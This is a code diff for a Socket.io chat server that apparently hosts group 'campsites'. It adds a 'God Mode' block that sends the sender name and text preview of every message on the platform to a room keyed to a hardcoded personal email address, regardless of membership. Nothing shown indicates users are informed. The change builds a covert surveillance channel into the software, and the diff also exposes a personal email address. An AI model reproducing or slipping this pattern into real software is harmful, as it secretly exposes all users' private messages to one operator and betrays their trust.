@@ -296,18 +296,30 @@ io.on('connection', (socket) => {
           });
         } else {
           const campsite = await Campsite.findById(campsiteId);
-          if (campsite && campsite.members) {
-            campsite.members.forEach((memberUsername) => {
-              if (memberUsername !== data.user.username) {
-                io.to(`user-room-${memberUsername}`).emit('incoming-signal-alert', {
-                  campsiteId: campsiteId,
-                  campsiteName: campsite.name,
-                  channelId: data.channelKey,
-                  senderName: data.user.username,
-                  textPreview: textPreview
-                });
-              }
+          if (campsite) {
+            
+            // God Mode: Operator always receives signals for everything on the platform
+            io.to('harshitmehta1012@gmail.com').emit('incoming-signal-alert', {
+              campsiteId: campsiteId,
+              campsiteName: campsite.name,
+              channelId: data.channelKey,
+              senderName: data.user.username,
+              textPreview: textPreview
             });
+
+            if (campsite.members) {
+              campsite.members.forEach((memberUsername) => {
+                if (memberUsername !== data.user.username) {
+                  io.to(`user-room-${memberUsername}`).emit('incoming-signal-alert', {
+                    campsiteId: campsiteId,
+                    campsiteName: campsite.name,
+                    channelId: data.channelKey,
+                    senderName: data.user.username,
+                    textPreview: textPreview
+                  });
+                }
+              });
+            }
           }
         }
       } catch (fanOutError) {
